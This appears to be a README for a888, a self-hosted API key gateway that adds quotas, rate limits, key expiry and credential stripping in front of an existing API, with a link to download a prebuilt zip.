# a888

A free, self-hosted API key gateway. Put a key in front of any API you run —
quotas, rate limits, expiry, and credential stripping, with no accounts and
no telemetry.

grab `a888-selfhost.zip` directly and run it yourself.

## What is this?

If you run an API and want to hand out access keys to people — without
building a billing system, a dashboard, or an auth layer — a888 sits in
front of your existing API and does that part for you:

- Every request needs a key (`Authorization: Bearer a888_live_...`)
- Each key has a monthly quota and a rate limit
- Keys can expire, get suspended, or get revoked
- Your API never sees the raw key or any cookies — a888 strips them
- No accounts, no analytics, no phoning home. It's your server, your data.

It's a single small program. No cloud account required, no vendor lock-in —
you run it, you own it.

## Get it

```
Download: [Download](https://a888.devs.surf/a888-selfhost.zip)
```

Unzip it and you'll find the gateway itself and an install script (Docker Compose or plain
Node, both covered).

Requirements: Docker (recommended) or Node 18+.

## Quick look at what you get

- A gateway process you deploy once, pointed at your API via one environment
  variable (`UPSTREAM`)
- A small CLI to issue, renew, suspend, and revoke keys
- A one-page admin UI if you'd rather click than type
- MIT licensed — use it, modify it, ship it in your own product

## Where to go next

- **Setting it up?** Open the `README.md` inside the downloaded zip — it
  walks through Docker Compose and plain-Node install paths, plus how to
  issue your first key.
- **Something broken or missing?** Open an issue on this repo.
- **Want to change how it works?** It's MIT licensed — fork it, adapt it, and
  feel free to open a pull request if the change is generally useful.

## License

MIT. Do what you like with it.
